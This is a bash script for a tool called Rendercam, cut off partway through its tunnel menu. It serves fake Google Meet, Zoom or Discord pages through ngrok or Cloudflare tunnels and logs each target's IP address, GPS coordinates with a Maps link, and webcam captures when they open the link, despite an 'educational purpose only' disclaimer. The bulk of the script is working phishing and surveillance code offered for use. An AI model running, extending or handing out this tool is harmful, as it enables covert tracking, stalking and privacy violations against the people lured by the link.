#!/bin/bash

# Rendercam v1.0.0

__version__="1.1.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI Colors (Foreground + Background)
# Standard Colors
BLACK="$(printf '\033[30m')"   RED="$(printf '\033[31m')"     GREEN="$(printf '\033[32m')"  
YELLOW="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"    MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"    WHITE="$(printf '\033[37m')"   ORANGE="$(printf '\033[38;5;208m')"

# Bright Colors
BRIGHT_BLACK="$(printf '\033[90m')"   BRIGHT_RED="$(printf '\033[91m')"    
BRIGHT_GREEN="$(printf '\033[92m')"   BRIGHT_YELLOW="$(printf '\033[93m')"  
BRIGHT_BLUE="$(printf '\033[94m')"    BRIGHT_MAGENTA="$(printf '\033[95m')"  
BRIGHT_CYAN="$(printf '\033[96m')"    BRIGHT_WHITE="$(printf '\033[97m')"

# Background Colors
BLACKBG="$(printf '\033[40m')"   REDBG="$(printf '\033[41m')"     GREENBG="$(printf '\033[42m')"  
YELLOWBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"    MAGENTABG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"    WHITEBG="$(printf '\033[47m')"

# Bright Background Colors
BRIGHT_BLACKBG="$(printf '\033[100m')"   BRIGHT_REDBG="$(printf '\033[101m')"    
BRIGHT_GREENBG="$(printf '\033[102m')"   BRIGHT_YELLOWBG="$(printf '\033[103m')"  
BRIGHT_BLUEBG="$(printf '\033[104m')"    BRIGHT_MAGENTABG="$(printf '\033[105m')"  
BRIGHT_CYANBG="$(printf '\033[106m')"    BRIGHT_WHITEBG="$(printf '\033[107m')"

# Text Effects
BOLD="$(printf '\033[1m')"
DIM="$(printf '\033[2m')"
ITALIC="$(printf '\033[3m')"
UNDERLINE="$(printf '\033[4m')"
INVERT="$(printf '\033[7m')"
HIDDEN="$(printf '\033[8m')"
STRIKE="$(printf '\033[9m')"

# Reset
RESET="$(printf '\033[0m')"
RESETBG="$(printf '\033[49m')"


## Reset terminal colors
reset_color() {
    tput sgr0   # reset attributes
    tput op     # reset color
    return
}


## Banner
banner() {
  clear
  printf "${BRIGHT_CYAN}                     _\e[0m\n"
  printf "${BRIGHT_CYAN}                    | |\e[0m\n"
  printf "${BRIGHT_CYAN}  _ __ ___ _ __   __| | ___ _ __   ___ __ _ _ __ ___\e[0m\n"
  printf "${BRIGHT_CYAN} |  __/ _ \\  _ \\ / _  |/ _ \\  __| / __/ _  |  _   _ \\  \e[0m\n"
  printf "${BRIGHT_CYAN} | | |  __/ | | | (_| |  __/ |   | (_| (_| | | | | | |\e[0m\n"
  printf "${BRIGHT_CYAN} |_|  \\___|_| |_|\\__,_|\\___|_|    \\___\\__,_|_| |_| |_|\e[0m\n"
  printf "${BRIGHT_RED}     Tool created by Render${RESET}${BRIGHT_CYAN}             Version: ${BRIGHT_RED}%s${RESET}\n" "${__version__}"
  printf "\n"
}



## Small Banner
banner_small() {
  clear
  printf "${BRIGHT_BLUE}									   ${RESET}\n"
  printf "${BRIGHT_BLUE} ░░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░█▀▀░█▀█░█▄█ ${RESET}\n"
  printf "${BRIGHT_BLUE} ░░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░█░░░█▀█░█░█ ${RESET}\n"
  printf "${BRIGHT_BLUE} ░░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀░▀ ${RESET}\n"
  printf "${BRIGHT_RED}                   Version %s${RESET}\n" "${__version__}"
  printf "\n"
}


# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "\\\$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "\\\$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq \\\$1" 2>/dev/null
    else
      taskkill /F /IM "\\\$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

## Check for Dependencies
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

## Kill Processes
stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

## Kill already running process
kill_pid() {
    check_PID="php cloudflared loclx"
    for process in ${check_PID}; do
    	if [[ $(pidof ${process}) ]]; then # Check for Process
        	killall ${process} > /dev/null 2>&1 # Kill the Process
        fi
    done
}

# Check for new update
check_update() {
	local release_url='https://api.github.com/repos/render437/rendercam/releases/latest'
	local ua='rendercam-updater/1.0 (+https://example.com)'
	local tmpfile new_version tarball_url
	
	# Prerequisites check
	for cmd in curl tar mktemp awk grep; do
		command -v "$cmd" >/dev/null 2>&1 || {
			echo "[!] Required command '$cmd' not found"
      		return 1
    	}
  	done

	[ -n "$__version__" ] || { echo "[!] __version__ not set"; return 1; }
	[ -n "$BASE_DIR" ]   || { echo "[!] BASE_DIR not set"; return 1; }

	echo -ne "\n${BRIGHT_GREEN} Checking for update: "

	# --- Get latest version safely ---
	if command -v jq >/dev/null 2>&1; then
		new_version=$(curl -sS -A "$ua" "$release_url" | jq -r '.tag_name // .name // empty')
	else
    	new_version=$(curl -sS -A "$ua" "$release_url" \
		| grep -E '"tag_name"|"name"' \
		| head -n1 \
		| awk -F\" '{print \\$4}')
  	fi

	if [ -z "$new_version" ]; then
		echo -e "${ORANGE}Could not determine latest version.${WHITE}"
		return 1
	fi

	tarball_url="https://github.com/render437/rendercam/archive/refs/tags/${new_version}.tar.gz"

	# --- Compare versions ---
	if [[ "$new_version" != "$__version__" ]]; then
		echo -e "${ORANGE}Update found${WHITE}"
    	sleep 1
    	echo -ne "\n${ORANGE} Downloading Update..."

		tmpfile=$(mktemp /tmp/rendercam.XXXXXX.tar.gz) \
			|| { echo "[!] mktemp failed"; return 1; }

		# Download safely with retries
    	if ! curl --fail --show-error --retry 3 --retry-delay 2 -L \
      		-A "$ua" -o "$tmpfile" "$tarball_url"; then
      		echo -e "\n${RED} Error occurred while downloading.${WHITE}"
      		rm -f "$tmpfile"
      		return 1
		fi

		# Ensure BASE_DIR exists
		if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
			echo -e "\n${RED} Cannot create BASE_DIR: $BASE_DIR${WHITE}"
			rm -f "$tmpfile"
			return 1
		fi

    	# Extract safely
    	if ! tar -xzf "$tmpfile" -C "$BASE_DIR" --strip-components=1 >/dev/null 2>&1; then
      		echo -e "\n\n${RED} Error occurred while extracting.${WHITE}"
			rm -f "$tmpfile"
			return 1
		fi

		rm -f "$tmpfile"
    	{ sleep 1; clear; banner_small; } 2>/dev/null
    	echo -e "\n${BRIGHT_GREEN} Successfully updated to ${new_version}! Run rendercam again\n"
    	reset_color 2>/dev/null || true
    	return 0

  	else
    	echo -e "${GREEN}Up to date${WHITE}"
    	sleep .5
		return 0
  	fi
}

## Check Internet Status
check_status() {
        echo -ne "\n${CYAN} Internet Status: "
        timeout 3s curl -fIs "https://api.github.com" > /dev/null
        [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e ""
}


catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "${YELLOW}${BOLD}[${RESET}+${YELLOW}${BOLD}] IP:${RESET}${BRIGHT_WHITE}${BOLD} %s${RESET}\n" $ip

cat ip.txt >> saved.ip.txt
}

catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "current_location.txt" ]]; then
    printf "${GREEN}${BOLD}[${RESET}+${GREEN}${BOLD}] Current location data:${RESET}\n"
    # Filter out unwanted messages before displaying
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    
    # Move it to a backup to avoid duplicate display
    mv current_location.txt current_location.bak
  fi

  # Then check for any location_* files
  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    # Only display essential location data
    printf "${BRIGHT_YELLOW}${BOLD}[${RESET}+${BRIGHT_YELLOW}${BOLD}] Latitude:${RESET}${BRIGHT_WHITE}${BOLD} %s${RESET}\n" $lat
    printf "${BRIGHT_YELLOW}${BOLD}[${RESET}+${BRIGHT_YELLOW}${BOLD}] Longitude:${RESET}${BRIGHT_WHITE}${BOLD} %s${RESET}\n" $lon
    printf "${BRIGHT_YELLOW}${BOLD}[${RESET}+${BRIGHT_YELLOW}${BOLD}] Accuracy:${RESET}${BRIGHT_WHITE}${BOLD} %s meters${RESET}\n" $acc
    printf "${BRIGHT_YELLOW}${BOLD}[${RESET}+${BRIGHT_YELLOW}${BOLD}] Google Maps:${RESET}${BRIGHT_WHITE}${BOLD} %s${RESET}\n" $maps_link
    
    # Create directory for saved locations if it doesn't exist
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    
    mv "$location_file" saved_locations/
    printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] Location saved to saved_locations/%s${RESET}\n" "$location_file"
  else
    printf "${RED}${BOLD}[${RESET}!${RED}${BOLD}] No location file found${RESET}\n"
    
    # Don't display any debug logs to avoid showing unwanted messages
  fi
}

checkfound() {
# Create directory for saved locations if it doesn't exist
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi

printf "\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] Waiting targets,${RESET}${BRIGHT_WHITE}${BOLD} Press Ctrl + C to exit...${RESET}\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] GPS Location tracking is ${RESET}${BRIGHT_YELLOW}ACTIVE${RESET}\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

# Check for current_location.txt first (our new immediate indicator)
if [[ -e "current_location.txt" ]]; then
printf "\n${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Location data received!${RESET}\n"
catch_location
fi

# Also check for LocationLog.log (the original indicator)
if [[ -e "LocationLog.log" ]]; then
printf "\n${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Location data received!${RESET}\n"
# Don't display the raw log content, just process it
catch_location
rm -rf LocationLog.log
fi

# Don't display error logs to avoid showing unwanted messages
if [[ -e "LocationError.log" ]]; then
# Just remove the file without displaying its contents
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
printf "\n${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Cam file received!${RESET}\n"
rm -rf Log.log
fi
sleep 0.5

done 
}


cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "${BRIGHT_GREEN}${BOLD}[${RESET}~${BRIGHT_GREEN}${BOLD}] ${ORANGE}Downloading Cloudflared...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "${BRIGHT_GREEN}${BOLD}[${RESET}~${BRIGHT_GREEN}${BOLD}] ${ORANGE}Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "${RED}[!] Download error... ${RESET}\n"
        exit 1
    fi
else
    # Other systems detection
    if [[ "$os" == "Darwin" ]]; then
        printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
		else
            printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] Intel Mac detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "${RED}[!] Download error... ${RESET}\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] x86_64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] x86 32-bit architecture detected...\n"
                wget --no-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] ARM64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] ARM architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}-${BRIGHT_GREEN}${BOLD}] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            printf "${BRIGHT_YELLOW}[!] Download error... ${RESET}\n"
            exit 1
        fi
    fi
fi
fi

printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] Starting php server...\n"
php -S "$HOST:$PORT" > /dev/null 2>&1 &
sleep 2
printf "${BRIGHT_GREEN}${BOLD}[${RESET}>${BRIGHT_GREEN}${BOLD}] Starting cloudflared tunnel...\n"
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url "$HOST:$PORT" --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url "$HOST:$PORT" --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
printf "${BRIGHT_RED}[!] Direct link is not generating, check following possible reason  ${RESET}\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW} CloudFlare tunnel service might be down\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW} If you are using android, turn hotspot on\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW} CloudFlared is already running, run this command killall cloudflared\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW} Check your internet connection\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW} Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW} On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
exit 1
else
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] Direct link:${RESET}${BRIGHT_WHITE}${BOLD} %s${RESET}\n" $link
fi
payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' googlemeet.html > index3.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' zoom.html > index3.html
else
sed 's+forwarding_link+'$link'+g' discord.html > index2.html
fi
rm -rf index3.html
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] ${ORANGE}Downloading Ngrok...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] ${ORANGE}Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "${BRIGHT_YELLOW}[!] Download error... ${RESET}\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "${RED}[!] Download error... ${RESET}\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "${RED}[!] Download error... ${RESET}\n"
            exit 1
        fi
    fi
fi
fi

# Ngrok auth token handling
if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        printf "${BRIGHT_YELLOW}${BOLD}[${RESET}*${BRIGHT_YELLOW}${BOLD}] your ngrok "
        cat "$USERPROFILE\.ngrok2\ngrok.yml"
        read -p $'\n${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Do you want to change your ngrok authtoken? [Y/n]:${RESET} ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW}Authtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting php server...\n"
    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    sleep 2
    printf "${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting ngrok server...\n"
    ./ngrok.exe http "$PORT" > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "${BRIGHT_YELLOW}${BOLD}[${RESET}*${BRIGHT_YELLOW}${BOLD}] your ngrok "
        cat  ~/.ngrok2/ngrok.yml
        read -p $'\n${BRIGHT_GREEN}${BOLD}[${RESET}+${BRIGHT_GREEN}${BOLD}] Do you want to change your ngrok authtoken? [Y/n]:${RESET} ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] ${RESET}${BRIGHT_YELLOW}Authtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting php server...\n"
    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    sleep 2
    printf "${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting ngrok server...\n"
    ./ngrok http "$PORT" > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "${RED} [!] Direct link is not generating, check following possible reason  ${RESET}\n"
printf "${RED} [-] Ngrok authtoken is not valid\n"
printf "${RED} [-] If you are using android, turn hotspot on\n"
printf "${RED} [-] Ngrok is already running, run this command killall ngrok\n"
printf "${RED} [-] Check your internet connection\n"
printf "${RED} [-] Try running ngrok manually: ./ngrok http 3333\n"
exit 1
else
printf "${BRIGHT_GREEN}${BOLD}[${RESET}*${BRIGHT_GREEN}${BOLD}] Direct link:${RESET}${BRIGHT_WHITE}${BOLD} %s${RESET}\n" $link
fi
payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' googlemeet.html > index3.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' zoom.html > index3.html
else
sed 's+forwarding_link+'$link'+g' discord.html > index2.html
fi
rm -rf index3.html
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## About
about() {
  { clear; banner; echo; }

  printf "${BRIGHT_BLACK} -----------------------------------------------------------------${RESET}\n"
  printf "${BRIGHT_GREEN}  Author:   ${BRIGHT_BLUE}render437\n"
  printf "${BRIGHT_GREEN}  Github:   ${BRIGHT_BLUE}https://github.com/render437\n"
  printf "${BRIGHT_GREEN}  Version:  ${BRIGHT_BLUE}%s\n\n" "${__version__}"
  printf "${BRIGHT_BLACK} -----------------------------------------------------------------${RESET}\n"
  printf "${RED} Warning:\n"
  printf "${RED}  ${UNDERLINE}This Tool is made for educational purpose only!${RESET}\n"
  printf "${RED}  ${UNDERLINE}Author will not be responsible for any misuse of this toolkit!${RESET}\n\n"
  printf "${BRIGHT_BLACK} -----------------------------------------------------------------${RESET}\n"
  printf "${ORANGE} Contributors:\n"
  printf "${BRIGHT_GREEN}  Aditya Shakya, techchipnet, Kr3sZ, Prateek\n\n"
  printf "${BRIGHT_BLACK} -----------------------------------------------------------------${RESET}\n"
  printf "  ${BRIGHT_CYAN}99.${RESET} Main Menu               ${BRIGHT_CYAN}00.${RESET} Exit\n\n"

  read -p "${MAGENTA}Select an option: "

  case $REPLY in
    99)
      printf "\n${CYAN} Returning to main menu..."
      { sleep 1; main_menu; };;
    0 | 00)
      msg_exit;;
    *)
      printf "\n${RED} Invalid Option, Try Again..."
      { sleep 1; about; };;
  esac
}


## Tunnel selection
tunnel_menu() {
  { clear; banner_small; }

  printf "${CYAN} 00. Main Menu\n"
  printf "${CYAN} 01. Localhost\n"
  printf "${CYAN} 02. Ngrok.io\n"
  printf "${CYAN} 03. Cloudflared\n\n"

  read -p "${MAGENTA} Select a port forwarding service or return to main menu:"

  case $REPLY in
    0 | 00)
      printf "\n${CYAN} Returning to main menu..."
      { sleep 1; main_menu; };;
    1 | 01)
      # Localhost option: Directly run PHP server
      printf "\n${GREEN}${BOLD}[${WHITE}>${GREEN}${BOLD}] Starting PHP server on %s:%s...\n" "$HOST" "$PORT"
      php -S "$HOST:$PORT" > /dev/null 2>&1 &
      sleep 5  # Give the server some time to start
